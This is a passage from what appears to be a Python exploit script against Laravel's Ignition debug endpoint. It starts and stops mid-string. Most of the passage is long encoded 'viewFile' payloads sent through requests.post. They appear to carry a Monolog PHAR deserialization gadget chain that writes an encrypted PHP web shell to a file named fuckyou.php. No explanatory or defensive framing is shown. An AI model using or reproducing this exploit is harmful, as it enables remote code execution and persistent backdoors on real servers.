\"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=71=00=2F=00=42=00=77=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=6F=00=42=00=77=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=32=00=4E=00=44=00=45=00=36=00=49=00=6D=00=56=00=6A=00=61=00=47=00=38=00=67=00=58=00=6A=00=77=00=2F=00=63=00=47=00=68=00=77=00=49=00=48=00=4E=00=6C=00=63=00=33=00=4E=00=70=00=62=00=32=00=35=00=66=00=63=00=33=00=52=00=68=00=63=00=6E=00=51=00=6F=00=4B=00=54=00=74=00=41=00=63=00=32=00=56=00=30=00=58=00=33=00=52=00=70=00=62=00=57=00=56=00=66=00=62=00=47=00=6C=00=74=00=61=00=58=00=51=00=6F=00=4D=00=43=00=6B=00=37=00=51=00=47=00=56=00=79=00=63=00=6D=00=39=00=79=00=58=00=33=00=4A=00=6C=00=63=00=47=00=39=00=79=00=64=00=47=00=6C=00=75=00=5A=00=79=00=67=00=77=00=4B=00=54=00=74=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=46=00=4B=00=46=00=34=00=6B=00=52=00=43=00=78=00=65=00=4A=00=45=00=73=00=70=00=65=00=32=00=5A=00=76=00=63=00=69=00=68=00=65=00=4A=00=47=00=6B=00=39=00=4D=00=44=00=74=00=65=00=4A=00=47=00=6C=00=65=00=50=00=48=00=4E=00=30=00=63=00=6D=00=78=00=6C=00=62=00=69=00=68=00=65=00=4A=00=45=00=51=00=70=00=4F=00=31=00=34=00=6B=00=61=00=53=00=73=00=72=00=4B=00=53=00=42=00=37=00=58=00=69=00=52=00=45=00=57=00=31=00=34=00=6B=00=61=00=56=00=30=00=67=00=50=00=53=00=42=00=65=00=4A=00=45=00=52=00=62=00=58=00=69=00=52=00=70=00=58=00=56=00=35=00=65=00=58=00=69=00=52=00=4C=00=57=00=31=00=34=00=6B=00=61=00=53=00=73=00=78=00=58=00=69=00=59=00=78=00=4E=00=56=00=30=00=37=00=66=00=58=00=4A=00=6C=00=64=00=48=00=56=00=79=00=62=00=69=00=42=00=65=00=4A=00=45=00=51=00=37=00=66=00=57=00=5A=00=31=00=62=00=6D=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=46=00=45=00=6F=00=58=00=69=00=52=00=45=00=4B=00=58=00=74=00=79=00=5A=00=58=00=52=00=31=00=63=00=6D=00=34=00=67=00=59=00=6D=00=46=00=7A=00=5A=00=54=00=59=00=30=00=58=00=32=00=56=00=75=00=59=00=32=00=39=00=6B=00=5A=00=53=00=68=00=65=00=4A=00=45=00=51=00=70=00=4F=00=33=00=31=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=50=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6C=00=37=00=63=00=6D=00=56=00=30=00=64=00=58=00=4A=00=75=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=46=00=39=00=6B=00=5A=00=57=00=4E=00=76=00=5A=00=47=00=55=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=39=00=58=00=69=00=52=00=51=00=50=00=53=00=64=00=77=00=59=00=58=00=4E=00=7A=00=4A=00=7A=00=74=00=65=00=4A=00=46=00=59=00=39=00=4A=00=33=00=42=00=68=00=65=00=57=00=78=00=76=00=59=00=57=00=51=00=6E=00=4F=00=31=00=34=00=6B=00=56=00=44=00=30=00=6E=00=4D=00=32=00=4D=00=32=00=5A=00=54=00=42=00=69=00=4F=00=47=00=45=00=35=00=59=00=7A=00=45=00=31=00=4D=00=6A=00=49=00=30=00=59=00=53=00=63=00=37=00=61=00=57=00=59=00=67=00=4B=00=47=00=6C=00=7A=00=63=00=32=00=56=00=30=00=4B=00=46=00=34=00=6B=00=58=00=31=00=42=00=50=00=55=00=31=00=52=00=62=00=58=00=69=00=52=00=51=00=58=00=53=00=6B=00=70=00=65=00=31=00=34=00=6B=00=52=00=6A=00=31=00=50=00=4B=00=45=00=55=00=6F=00=54=00=79=00=68=00=65=00=4A=00=46=00=39=00=51=00=54=00=31=00=4E=00=55=00=57=00=31=00=34=00=6B=00=55=00=46=00=30=00=70=00=4C=00=46=00=34=00=6B=00=56=00=43=00=6B=00=70=00=4F=00=32=00=6C=00=6D=00=49=00=43=00=68=00=70=00=63=00=33=00=4E=00=6C=00=64=00=43=00=68=00=65=00=4A=00=46=00=39=00=54=00=52=00=56=00=4E=00=54=00=53=00=55=00=39=00=4F=00=57=00=31=00=34=00=6B=00=56=00=6C=00=30=00=70=00=4B=00=58=00=74=00=65=00=4A=00=45=00=77=00=39=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=4F=00=31=00=34=00=6B=00=51=00=54=00=31=00=6C=00=65=00=48=00=42=00=73=00=62=00=32=00=52=00=6C=00=4B=00=43=00=64=00=65=00=66=00=43=00=63=00=73=00=58=00=69=00=52=00=4D=00=4B=00=54=00=74=00=6A=00=62=00=47=00=46=00=7A=00=63=00=79=00=42=00=44=00=65=00=33=00=42=00=31=00=59=00=6D=00=78=00=70=00=59=00=79=00=42=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=75=00=64=00=6D=00=39=00=72=00=5A=00=53=00=68=00=65=00=4A=00=48=00=41=00=70=00=49=00=48=00=74=00=6C=00=64=00=6D=00=46=00=73=00=4B=00=46=00=34=00=6B=00=63=00=43=00=34=00=69=00=49=00=69=00=6B=00=37=00=66=00=58=00=31=00=65=00=4A=00=46=00=49=00=39=00=62=00=6D=00=56=00=33=00=49=00=45=00=4D=00=6F=00=4B=00=54=00=74=00=65=00=4A=00=46=00=49=00=74=00=58=00=6A=00=35=00=75=00=64=00=6D=00=39=00=72=00=5A=00=53=00=68=00=65=00=4A=00=45=00=46=00=62=00=4D=00=46=00=30=00=70=00=4F=00=32=00=56=00=6A=00=61=00=47=00=38=00=67=00=63=00=33=00=56=00=69=00=63=00=33=00=52=00=79=00=4B=00=47=00=31=00=6B=00=4E=00=53=00=68=00=65=00=4A=00=46=00=41=00=75=00=58=00=69=00=52=00=55=00=4B=00=53=00=77=00=77=00=4C=00=44=00=45=00=32=00=4B=00=54=00=74=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=45=00=6F=00=52=00=53=00=68=00=41=00=63=00=6E=00=56=00=75=00=4B=00=46=00=34=00=6B=00=52=00=69=00=6B=00=73=00=58=00=69=00=52=00=55=00=4B=00=53=00=6B=00=37=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=7A=00=64=00=57=00=4A=00=7A=00=64=00=48=00=49=00=6F=00=62=00=57=00=51=00=31=00=4B=00=46=00=34=00=6B=00=55=00=43=00=35=00=65=00=4A=00=46=00=51=00=70=00=4C=00=44=00=45=00=32=00=4B=00=54=00=74=00=39=00=5A=00=57=00=78=00=7A=00=5A=00=58=00=74=00=65=00=4A=00=46=00=39=00=54=00=52=00=56=00=4E=00=54=00=53=00=55=00=39=00=4F=00=57=00=31=00=34=00=6B=00=56=00=6C=00=30=00=39=00=58=00=69=00=52=00=47=00=4F=00=33=00=31=00=39=00=49=00=44=00=34=00=75=00=4C=00=32=00=5A=00=31=00=59=00=32=00=74=00=35=00=62=00=33=00=55=00=75=00=63=00=47=00=68=00=77=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6C=00=4E=00=70=00=65=00=6D=00=55=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=54=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=51=00=78=00=4F=00=69=00=4A=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=34=00=38=00=50=00=33=00=42=00=6F=00=63=00=43=00=42=00=7A=00=5A=00=58=00=4E=00=7A=00=61=00=57=00=39=00=75=00=58=00=33=00=4E=00=30=00=59=00=58=00=4A=00=30=00=4B=00=43=00=6B=00=37=00=51=00=48=00=4E=00=6C=00=64=00=46=00=39=00=30=00=61=00=57=00=31=00=6C=00=58=00=32=00=78=00=70=00=62=00=57=00=6C=00=30=00=4B=00=44=00=41=00=70=00=4F=00=30=00=42=00=6C=00=63=00=6E=00=4A=00=76=00=63=00=6C=00=39=00=79=00=5A=00=58=00=42=00=76=00=63=00=6E=00=52=00=70=00=62=00=6D=00=63=00=6F=00=4D=00=43=00=6B=00=37=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=52=00=53=00=68=00=65=00=4A=00=45=00=51=00=73=00=58=00=69=00=52=00=4C=00=4B=00=58=00=74=00=6D=00=62=00=33=00=49=00=6F=00=58=00=69=00=52=00=70=00=50=00=54=00=41=00=37=00=58=00=69=00=52=00=70=00=58=00=6A=00=78=00=7A=00=64=00=48=00=4A=00=73=00=5A=00=57=00=34=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=65=00=4A=00=47=00=6B=00=72=00=4B=00=79=00=6B=00=67=00=65=00=31=00=34=00=6B=00=52=00=46=00=74=00=65=00=4A=00=47=00=6C=00=64=00=49=00=44=00=30=00=67=00=58=00=69=00=52=00=45=00=57=00=31=00=34=00=6B=00=61=00=56=00=31=00=65=00=58=00=6C=00=34=00=6B=00=53=00=31=00=74=00=65=00=4A=00=47=00=6B=00=72=00=4D=00=56=00=34=00=6D=00=4D=00=54=00=56=00=64=00=4F=00=33=00=31=00=79=00=5A=00=58=00=52=00=31=00=63=00=6D=00=34=00=67=00=58=00=69=00=52=00=45=00=4F=00=33=00=31=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=52=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6C=00=37=00=63=00=6D=00=56=00=30=00=64=00=58=00=4A=00=75=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=46=00=39=00=6C=00=62=00=6D=00=4E=00=76=00=5A=00=47=00=55=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=39=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=54=00=79=00=68=00=65=00=4A=00=45=00=51=00=70=00=65=00=33=00=4A=00=6C=00=64=00=48=00=56=00=79=00=62=00=69=00=42=00=69=00=59=00=58=00=4E=00=6C=00=4E=00=6A=00=52=00=66=00=5A=00=47=00=56=00=6A=00=62=00=32=00=52=00=6C=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6B=00=37=00=66=00=56=00=34=00=6B=00=55=00=44=00=30=00=6E=00=63=00=47=00=46=00=7A=00=63=00=79=00=63=00=37=00=58=00=69=00=52=00=57=00=50=00=53=00=64=00=77=00=59=00=58=00=6C=00=73=00=62=00=32=00=46=00=6B=00=4A=00=7A=00=74=00=65=00=4A=00=46=00=51=00=39=00=4A=00=7A=00=4E=00=6A=00=4E=00=6D=00=55=00=77=00=59=00=6A=00=68=00=68=00=4F=00=57=00=4D=00=78=00=4E=00=54=00=49=00=79=00=4E=00=47=00=45=00=6E=00=4F=00=32=00=6C=00=6D=00=49=00=43=00=68=00=70=00=63=00=33=00=4E=00=6C=00=64=00=43=00=68=00=65=00=4A=00=46=00=39=00=51=00=54=00=31=00=4E=00=55=00=57=00=31=00=34=00=6B=00=55=00=46=00=30=00=70=00=4B=00=58=00=74=00=65=00=4A=00=45=00=59=00=39=00=54=00=79=00=68=00=46=00=4B=00=45=00=38=00=6F=00=58=00=69=00=52=00=66=00=55=00=45=00=39=00=54=00=56=00=46=00=74=00=65=00=4A=00=46=00=42=00=64=00=4B=00=53=00=78=00=65=00=4A=00=46=00=51=00=70=00=4B=00=54=00=74=00=70=00=5A=00=69=00=41=00=6F=00=61=00=58=00=4E=00=7A=00=5A=00=58=00=51=00=6F=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=4B=00=53=00=6C=00=37=00=58=00=69=00=52=00=4D=00=50=00=56=00=34=00=6B=00=58=00=31=00=4E=00=46=00=55=00=31=00=4E=00=4A=00=54=00=30=00=35=00=62=00=58=00=69=00=52=00=57=00=58=00=54=00=74=00=65=00=4A=00=45=00=45=00=39=00=5A=00=58=00=68=00=77=00=62=00=47=00=39=00=6B=00=5A=00=53=00=67=00=6E=00=58=00=6E=00=77=00=6E=00=4C=00=46=00=34=00=6B=00=54=00=43=00=6B=00=37=00=59=00=32=00=78=00=68=00=63=00=33=00=4D=00=67=00=51=00=33=00=74=00=77=00=64=00=57=00=4A=00=73=00=61=00=57=00=4D=00=67=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=62=00=6E=00=5A=00=76=00=61=00=32=00=55=00=6F=00=58=00=69=00=52=00=77=00=4B=00=53=00=42=00=37=00=5A=00=58=00=5A=00=68=00=62=00=43=00=68=00=65=00=4A=00=48=00=41=00=75=00=49=00=69=00=49=00=70=00=4F=00=33=00=31=00=39=00=58=00=69=00=52=00=53=00=50=00=57=00=35=00=6C=00=64=00=79=00=42=00=44=00=4B=00=43=00=6B=00=37=00=58=00=69=00=52=00=53=00=4C=00=56=00=34=00=2B=00=62=00=6E=00=5A=00=76=00=61=00=32=00=55=00=6F=00=58=00=69=00=52=00=42=00=57=00=7A=00=42=00=64=00=4B=00=54=00=74=00=6C=00=59=00=32=00=68=00=76=00=49=00=48=00=4E=00=31=00=59=00=6E=00=4E=00=30=00=63=00=69=00=68=00=74=00=5A=00=44=00=55=00=6F=00=58=00=69=00=52=00=51=00=4C=00=6C=00=34=00=6B=00=56=00=43=00=6B=00=73=00=4D=00=43=00=77=00=78=00=4E=00=69=00=6B=00=37=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=52=00=4B=00=45=00=55=00=6F=00=51=00=48=00=4A=00=31=00=62=00=69=00=68=00=65=00=4A=00=45=00=59=00=70=00=4C=00=46=00=34=00=6B=00=56=00=43=00=6B=00=70=00=4F=00=32=00=56=00=6A=00=61=00=47=00=38=00=67=00=63=00=33=00=56=00=69=00=63=00=33=00=52=00=79=00=4B=00=47=00=31=00=6B=00=4E=00=53=00=68=00=65=00=4A=00=46=00=41=00=75=00=58=00=69=00=52=00=55=00=4B=00=53=00=77=00=78=00=4E=00=69=00=6B=00=37=00=66=00=57=00=56=00=73=00=63=00=32=00=56=00=37=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=50=00=56=00=34=00=6B=00=52=00=6A=00=74=00=39=00=66=00=53=00=41=00=2B=00=4C=00=69=00=39=00=6D=00=64=00=57=00=4E=00=72=00=65=00=57=00=39=00=31=00=4C=00=6E=00=42=00=6F=00=63=00=43=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=39=00=42=00=51=00=41=00=41=00=41=00=47=00=52=00=31=00=62=00=57=00=31=00=35=00=42=00=41=00=41=00=41=00=41=00=41=00=4D=00=39=00=43=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=41=00=4D=00=39=00=43=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=52=00=76=00=35=00=4F=00=50=00=6D=00=31=00=45=00=6C=00=61=00=48=00=76=00=4D=00=42=00=6E=00=46=00=53=00=54=00=2F=00=6E=00=53=00=36=00=54=00=2B=00=75=00=46=00=69=00=51=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def sendpayloadlinux(url): data={ \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": \"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=39=00=43=00=41=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=6D=00=43=00=41=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=34=00=4D=00=44=00=41=00=36=00=49=00=6D=00=56=00=6A=00=61=00=47=00=38=00=67=00=55=00=45=00=51=00=35=00=64=00=32=00=46=00=49=00=51=00=57=00=64=00=4A=00=53=00=45=00=35=00=73=00=59=00=7A=00=4E=00=4F=00=63=00=47=00=49=00=79=00=4E=00=57=00=5A=00=6A=00=4D=00=31=00=4A=00=6F=00=59=00=32=00=35=00=52=00=62=00=30=00=74=00=55=00=64=00=45=00=46=00=6A=00=4D=00=6C=00=59=00=77=00=57=00=44=00=4E=00=53=00=63=00=47=00=4A=00=58=00=56=00=6D=00=5A=00=69=00=52=00=32=00=78=00=30=00=59=00=56=00=68=00=52=00=62=00=30=00=31=00=44=00=61=00=7A=00=64=00=52=00=52=00=31=00=5A=00=35=00=59=00=32=00=30=00=35=00=65=00=56=00=67=00=7A=00=53=00=6D=00=78=00=6A=00=52=00=7A=00=6C=00=35=00=5A=00=45=00=64=00=73=00=64=00=56=00=70=00=35=00=5A=00=33=00=64=00=4C=00=56=00=48=00=52=00=74=00=5A=00=46=00=63=00=31=00=61=00=6D=00=52=00=48=00=62=00=48=00=5A=00=69=00=61=00=55=00=4A=00=47=00=53=00=30=00=4E=00=53=00=52=00=55=00=78=00=44=00=55=00=6B=00=78=00=4C=00=57=00=48=00=52=00=74=00=59=00=6A=00=4E=00=4A=00=62=00=30=00=70=00=48=00=61=00=7A=00=6C=00=4A=00=52=00=45=00=46=00=6E=00=54=00=33=00=6C=00=53=00=63=00=46=00=42=00=49=00=54=00=6A=00=42=00=6A=00=62=00=58=00=68=00=73=00=59=00=6D=00=6C=00=6E=00=61=00=31=00=4A=00=44=00=61=00=7A=00=64=00=4B=00=52=00=32=00=74=00=79=00=53=00=33=00=6C=00=73=00=4E=00=30=00=70=00=46=00=55=00=6D=00=4A=00=4B=00=52=00=32=00=78=00=6B=00=55=00=46=00=4E=00=53=00=52=00=56=00=64=00=35=00=55=00=6E=00=42=00=59=00=56=00=6A=00=52=00=72=00=55=00=7A=00=46=00=7A=00=61=00=32=00=46=00=54=00=63=00=32=00=64=00=4E=00=55=00=30=00=46=00=74=00=53=00=55=00=52=00=46=00=4D=00=55=00=6C=00=47=00=4D=00=44=00=64=00=6D=00=57=00=45=00=70=00=73=00=5A=00=45=00=68=00=57=00=65=00=57=00=4A=00=70=00=55=00=6B=00=56=00=50=00=4D=00=7A=00=46=00=74=00=5A=00=46=00=63=00=31=00=61=00=6D=00=52=00=48=00=62=00=48=00=5A=00=69=00=61=00=55=00=4A=00=53=00=53=00=30=00=4E=00=53=00=52=00=55=00=74=00=59=00=64=00=48=00=6C=00=61=00=57=00=46=00=49=00=78=00=59=00=32=00=30=00=30=00=5A=00=31=00=6C=00=74=00=52=00=6E=00=70=00=61=00=56=00=46=00=6B=00=77=00=57=00=44=00=4A=00=57=00=64=00=56=00=6B=00=79=00=4F=00=57=00=74=00=61=00=55=00=32=00=64=00=72=00=55=00=6B=00=4E=00=72=00=4E=00=32=00=5A=00=58=00=57=00=6A=00=46=00=69=00=62=00=55=00=34=0